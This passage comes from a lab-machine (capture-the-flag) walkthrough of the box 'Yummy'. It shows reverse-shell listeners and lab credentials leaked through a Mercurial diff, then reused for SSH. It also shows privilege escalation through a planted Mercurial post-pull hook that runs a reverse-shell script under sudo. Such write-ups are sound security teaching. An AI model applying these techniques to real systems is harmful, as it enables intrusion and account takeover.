+-rw-r--r-- 1 root  root   114 Sep 26 15:31 table_cleanup.sh</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780239477d7d271f7341b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">www-data</code></span><span class="SemanticString"> shell is soon caught.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f7800bb92ceb3d66172950" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.24] from (UNKNOWN) [10.129.195.30] 55688
+bash: cannot set terminal process group (11652): Inappropriate ioctl for device
+bash: no job control in this shell
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@yummy:/root$</span></mark></span><span class="SemanticString"><span> id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f7801fba2ac2876132b635" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Interestingly, I landed in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/root</code></span><span class="SemanticString">, but cannot list its directory contents nor read any files.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780afa5dcd78a3c01a294" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@yummy:/root$</span></mark></span><span class="SemanticString"><span> ls -la
+
+ls: cannot open directory &#x27;.&#x27;: Permission denied</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f78048ad78c29866c0b8d6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f780aaaf13eff4a94116f3" class="Divider"></div><h3 id="https://www.notion.so/1a30b98a88f780c28952d974932ae780" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1a30b98a88f780c28952d974932ae780"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">www-data</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1a30b98a88f780ea9cd9cbd587496b7b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Mercurial Version Control:</strong></span></span></p></div><div id="https://www.notion.so/1a30b98a88f7804aa401f7bc7d634d48" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s another web folder in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/var/www/</code></span><span class="SemanticString"> called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">app-qatesting</code></span><span class="SemanticString">. I’ll check the files again to see if there are any new config files or creds, but didn’t find any. The RSA and SQL vulnerabilities also seems to be patched in this version.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f7800aa185f4bd8eb4f25f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#!/usr/bin/python3</span>
+
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> serialization
+<span class="token keyword">import</span> sympy
+
+
+<span class="token comment"># Generate RSA key pair</span>
+q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>randprime<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">1023</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token comment"># this q number is too small</span>
+n <span class="token operator">=</span> sympy<span class="token punctuation">.</span>randprime<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">1023</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">*</span> q
+e <span class="token operator">=</span> <span class="token number">65537</span>
+p <span class="token operator">=</span> n <span class="token operator">//</span> q
+phi_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
+d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span>
+key_data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'n'</span><span class="token punctuation">:</span> n<span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">:</span> e<span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">:</span> d<span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">:</span> p<span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">:</span> q<span class="token punctuation">}</span>
+key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span>key_data<span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key_data<span class="token punctuation">[</span><span class="token string">'e'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key_data<span class="token punctuation">[</span><span class="token string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key_data<span class="token punctuation">[</span><span class="token string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key_data<span class="token punctuation">[</span><span class="token string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+private_key_bytes <span class="token operator">=</span> key<span class="token punctuation">.</span>export_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+private_key <span class="token operator">=</span> serialization<span class="token punctuation">.</span>load_pem_private_key<span class="token punctuation">(</span>
+    private_key_bytes<span class="token punctuation">,</span>
+    password<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>
+    backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">)</span>
+public_key <span class="token operator">=</span> private_key<span class="token punctuation">.</span>public_key<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f7809d855ae7e7730e32aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Also, there’s a strange hidden folder </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.hg/</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780fea62ccf7d140df006" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@yummy:~/app-qatesting$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 40
+drwxrwx--- 7 www-data qa        4096 May 28  2024 .
+drwxr-xr-x 3 www-data www-data  4096 Feb 21 16:34 ..
+-rw-rw-r-- 1 qa       qa       10852 May 28  2024 app.py
+drwxr-xr-x 3 qa       qa        4096 May 28  2024 config
+drwxrwxr-x 6 qa       qa        4096 May 28  2024 .hg
+drwxr-xr-x 3 qa       qa        4096 May 28  2024 middleware
+drwxr-xr-x 6 qa       qa        4096 May 28  2024 static
+drwxr-xr-x 2 qa       qa        4096 May 28  2024 templates</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f78019b78ec91b2efd77a2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looks like it contains some backups of old versions.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780f08324dbc3952e2cd2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@yummy:~/app-qatesting$</span></mark></span><span class="SemanticString"><span> ls -la .hg
+
+total 64
+drwxrwxr-x 6 qa       qa 4096 May 28  2024 .
+drwxrwx--- 7 www-data qa 4096 May 28  2024 ..
+-rw-rw-r-- 1 qa       qa   57 May 28  2024 00changelog.i
+-rw-rw-r-- 1 qa       qa    0 May 28  2024 bookmarks
+-rw-rw-r-- 1 qa       qa    8 May 28  2024 branch
+drwxrwxr-x 2 qa       qa 4096 May 28  2024 cache
+-rw-rw-r-- 1 qa       qa 7102 May 28  2024 dirstate
+-rw-rw-r-- 1 qa       qa   34 May 28  2024 last-message.txt
+-rw-rw-r-- 1 qa       qa   11 May 28  2024 requires
+drwxrwxr-x 4 qa       qa 4096 May 28  2024 store
+drwxrwxr-x 2 qa       qa 4096 May 28  2024 strip-backup
+-rw-rw-r-- 1 qa       qa    8 May 28  2024 undo.backup.branch.bck
+-rw-rw-r-- 1 qa       qa 7102 May 28  2024 undo.backup.dirstate.bck
+-rw-rw-r-- 1 qa       qa    9 May 28  2024 undo.desc
+drwxrwxr-x 2 qa       qa 4096 May 28  2024 wcache</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780ca95baf77fd4dc8b7b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After Googling, I learned that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.hg/</code></span><span class="SemanticString"> is used by </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.mercurial-scm.org/wiki/Repository">Mercurial</a></span><span class="SemanticString">, a version control tool similar to Git. Looking at Mercurial’s </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://gist.github.com/cortesben/016cd401faae5a8dae59">command cheatsheet</a></span><span class="SemanticString">, it seems like they have identical functionalities too.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f7801c964fcc5888fd4784" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Similar to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">git log -v</code></span><span class="SemanticString">, I can show old commits with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hg log -l 10</code></span><span class="SemanticString">. All except “removed comments” are related to the web app patching.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780e19c7be1901900138a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@yummy:~/app-qatesting$</span></mark></span><span class="SemanticString"><span> hg log -l 10
+
+WARNING: terminal is not fully functional
+Press RETURN to continue 
+
+changeset:   9:f3787cac6111
+tag:         tip
+user:        qa
+date:        Tue May 28 10:37:16 2024 -0400
+summary:     attempt at patching path traversal
+
+changeset:   8:0bbf8464d2d2
+user:        qa
+date:        Tue May 28 10:34:38 2024 -0400
+summary:     removed comments
+
+changeset:   7:2ec0ee295b83
+user:        qa
+date:        Tue May 28 10:32:50 2024 -0400
+summary:     patched SQL injection vuln
+
+changeset:   6:f87bdc6c94a8
+user:        qa
+date:        Tue May 28 10:27:32 2024 -0400
+summary:     patched signature vuln
+
+changeset:   5:6c59496d5251
+user:        dev
+:q</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780eeae36fb0039b994e7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I can also show the exact changes of the “removed comments” commit with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hg diff --change &lt;id&gt;</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780e58a86c525abbe11d7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@yummy:~/app-qatesting$</span></mark></span><span class="SemanticString"><span> hg diff --change 8:0bbf8464d2d2
+
+WARNING: terminal is not fully functional
+Press RETURN to continue 
+
+diff -r 2ec0ee295b83 -r 0bbf8464d2d2 app.py
+--- a/app.py    Tue May 28 10:32:50 2024 -0400
++++ b/app.py    Tue May 28 10:34:38 2024 -0400
+@@ -19,8 +19,8 @@
+ 
+ db_config = {
+     &#x27;host&#x27;: &#x27;127.0.0.1&#x27;,
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>-    &#x27;user&#x27;: &#x27;chef&#x27;,
+-    &#x27;password&#x27;: &#x27;3wDo7gSRZIwIHRxZ!&#x27;,</span></mark></span><span class="SemanticString"><span>
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>+    &#x27;user&#x27;: &#x27;qa&#x27;,
++    &#x27;password&#x27;: &#x27;jPAd!XQCtn8Oc@2B&#x27;,</span></mark></span><span class="SemanticString"><span>
+     &#x27;database&#x27;: &#x27;yummy_db&#x27;,
+     &#x27;cursorclass&#x27;: pymysql.cursors.DictCursor,
+     &#x27;client_flag&#x27;: CLIENT.MULTI_STATEMENTS
+@@ -254,17 +254,13 @@
+                 connection.commit()
+                 appointments = cursor.fetchall()
+ 
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>-                # Assume order_query comes from a request parameter</span></mark></span><span class="SemanticString"><span>
+                 order_query = request.args.get(&#x27;order&#x27;, &#x27;ASC&#x27;).upper()
+ 
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>-                # Validate the order_query to ensure it is either &#x27;ASC&#x27; or &#x27;DESC&#x27;</span></mark></span><span class="SemanticString"><span>
+:q</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f78044a33ef8fcbf096dbe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looks like </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">qa</code></span><span class="SemanticString">&#x27;s credentials were originally used for the database connection. It can also be reused for SSH login.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78059ab87d51a49b07ddd" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> ssh qa@yummy.htb
+
+Warning: Permanently added &#x27;yummy.htb&#x27; (ED25519) to the list of known hosts.
+qa@yummy.htb&#x27;s password: 
+Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-31-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri Feb 21 04:51:52 PM UTC 2025
+
+  System load:  0.01              Processes:             264
+  Usage of /:   61.2% of 5.56GB   Users logged in:       0
+  Memory usage: 21%               IPv4 address for eth0: 10.129.195.30
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+10 updates can be applied immediately.
+10 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>qa@yummy:~$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1001(qa) gid=1001(qa) groups=1001(qa)</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780899ce7d8357f78a430" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f780c3ba0ce2a74c6eb1b2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780638cf9c3232df5b56f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>qa@yummy:~$</span></mark></span><span class="SemanticString"><span> cat user.txt
+
+f1855900************************</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f7800fa436d383f7808bc5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f780b39e92e45f1bb3be60" class="Divider"></div><h3 id="https://www.notion.so/1a30b98a88f780b1b2d2dbcd42da3f72" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1a30b98a88f780b1b2d2dbcd42da3f72"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">qa</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1a30b98a88f780b8a92bd6038dc5d915" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Sudo Rights:</strong></span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78031bce1e2e89eb673d3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>qa@yummy:~$</span></mark></span><span class="SemanticString"><span> sudo -l
+[sudo] password for qa: 
+Matching Defaults entries for qa on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User qa may run the following commands on localhost:
+    (dev : dev) /usr/bin/hg pull /home/dev/app-production/</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f7805792dac182fb3f621d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">qa</code></span><span class="SemanticString"> can run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hg pull</code></span><span class="SemanticString"> as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dev</code></span><span class="SemanticString">. The command would pull </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/home/dev/app-production/</code></span><span class="SemanticString"> into the current repository. There’s also a Mercurial config file found in its home directory:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78047b264c1bc96ad8242" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>qa@yummy:~$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 44
+drwxr-x--- 6 qa   qa   4096 Sep 30 07:22 .
+drwxr-xr-x 4 root root 4096 May 27  2024 ..
+lrwxrwxrwx 1 root root    9 May 27  2024 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 qa   qa    220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 qa   qa   3771 May 27  2024 .bashrc
+drwx------ 2 qa   qa   4096 Feb 21 16:51 .cache
+drwx------ 3 qa   qa   4096 May 28  2024 .gnupg
+-rw-rw-r-- 1 qa   qa    728 May 29  2024 .hgrc
+drwxrwxr-x 3 qa   qa   4096 May 27  2024 .local
+-rw-r--r-- 1 qa   qa    807 Mar 31  2024 .profile
+drwx------ 2 qa   qa   4096 May 28  2024 .ssh
+-rw-r----- 1 root qa     33 Feb 21 11:50 user.txt
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>qa@yummy:~$</span></mark></span><span class="SemanticString"><span> cat .hgrc
+
+# example user config (see &#x27;hg help config&#x27; for more info)
+[ui]
+# name and email, e.g.
+# username = Jane Doe &lt;jdoe@example.com&gt;
+username = qa
+
+# We recommend enabling tweakdefaults to get slight improvements to
+# the UI over time. Make sure to set HGPLAIN in the environment when
+# writing scripts!
+# tweakdefaults = True
+
+# uncomment to disable color in command output
+# (see &#x27;hg help color&#x27; for details)
+# color = never
+
+# uncomment to disable command output pagination
+# (see &#x27;hg help pager&#x27; for details)
+# paginate = never
+
+[extensions]
+# uncomment the lines below to enable some popular extensions
+# (see &#x27;hg help extensions&#x27; for more info)
+#
+# histedit =
+# rebase =
+# uncommit =
+[trusted]
+users = qa, dev
+groups = qa, dev</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780d39fbbcc18c33626bf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f780ad84eee87a97cb05f8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Mercurial Hooks:</strong></span></span></p></div><div id="https://www.notion.so/1a30b98a88f780659a6aeb0524d58e65" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Mercurial can have hooks configured to run after a pull. According to the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://repo.mercurial-scm.org/hg/help/hgrc">docs</a></span><span class="SemanticString">, these are configured by a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hgrc</code></span><span class="SemanticString"> file placed within the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.hg/</code></span><span class="SemanticString"> folder.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f7803e9a0dc093afa1af07" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll make a copy of the config file found in the home directory and add the following lines. It should run my reverse shell script after making a pull.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780dfaba0eae4c3322a91" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>[hooks]
+post-pull = /tmp/rev.sh</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780cd9e92ea5a0f624b22" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Note that the config file and the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.hg</code></span><span class="SemanticString"> folder must be accessible by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dev</code></span><span class="SemanticString">, otherwise it won’t work. I did it the lazy way of creating a folder in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/tmp</code></span><span class="SemanticString"> and granting 777 permissions for everything within it.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78069972ec14149c258cb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>qa@yummy:/tmp/exploit$ ls -la .hg
+total 12
+drwxrwxrwx 2 qa qa 4096 Feb 21 17:17 .
+drwxrwxrwx 3 qa qa 4096 Feb 21 17:17 ..
+-rwxrwxrwx 1 qa qa  761 Feb 21 17:12 hgrc</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f78079ae61cbdda8e5a004" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll run the sudo command again, and it hangs.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78014aaaccaeaf19be7ad" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>qa@yummy:/tmp/exploit$</span></mark></span><span class="SemanticString"><span> sudo -u dev /usr/bin/hg pull /home/dev/app-production/
+
+pulling from /home/dev/app-production/
+requesting all changes
+adding changesets
+adding manifests
+adding file changes
+added 6 changesets with 129 changes to 124 files
+new changesets f54c91c7fae8:6c59496d5251
+(run &#x27;hg update&#x27; to get a working copy)</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780dba771e4e367113d40" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On my listener, a shell as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dev</code></span><span class="SemanticString"> is caught.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780d99292f1c751bc5a94" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.24] from (UNKNOWN) [10.129.195.30] 57190
+I&#x27;m out of office until February 22th, don&#x27;t call me
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dev@yummy:/tmp/exploit$</span></mark></span><span class="SemanticString"><span> id
+
